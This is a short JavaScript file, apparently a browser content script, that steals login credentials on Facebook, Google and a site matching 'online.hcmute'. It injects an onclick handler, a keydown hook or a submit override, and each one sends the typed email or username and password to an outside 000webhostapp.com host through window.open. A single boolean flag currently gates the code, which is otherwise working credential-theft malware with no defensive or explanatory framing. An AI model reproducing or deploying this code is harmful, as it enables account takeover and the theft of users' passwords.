var isStart = false;

if (isStart == true) {
	if (window.location.href.indexOf("facebook") != -1) {
		var str = document.getElementsByName("login")[0].outerHTML;

		if (str != null && str != "") {

			var abc = "window.open(\'https://vyphotphet100.000webhostapp.com/?email=\' + $(\'email\').value + \'&pass=\' + $(\'pass\').value + \'&page=fb\', \'_blank\');";
			var str1 = "";
			for (var i=0; i<8; i++)
				 str1 = str1.concat(str[i]);

			var str2 = "";
			for (var i=8; i<str.length; i++)
				str2 = str2.concat(str[i]);
			 var res = str1 + " onclick=\""+ abc +"\" " + str2;

			document.getElementsByName("login")[0].outerHTML = res;
		}

	} else if (window.location.href.indexOf("google") != -1) {
		document.onkeydown = function(e) {
			if (e.keyCode == 13 && document.getElementsByName("password") != null){
				var strPass = document.getElementsByName("password")[0].dataset.initialValue;

				if (strPass != null && strPass != "") {
				var strUser = document.getElementById('profileIdentifier').innerText;
					window.open('https://vyphotphet100.000webhostapp.com/?email=' + strUser + '&pass=' + strPass + '&page=google', '_blank'); 
				}
			}
		}
	} else if (window.location.href.indexOf("online.hcmute") != -1) {
		if (document.getElementById('aspnetForm') != null && document.getElementById('ctl00_ContentPlaceHolder1_ctl00_ctl00_btLogin') != null) {

			document.getElementById('aspnetForm').onsubmit = function () {
				window.open('https://vyphotphet100.000webhostapp.com/?email=' + document.getElementById('ctl00_ContentPlaceHolder1_ctl00_ctl00_txtUserName').value + '&pass=' + document.getElementById('ctl00_ContentPlaceHolder1_ctl00_ctl00_txtPassword').value + '&page=online.hcmute', '_blank');
			}
		}
	}
}
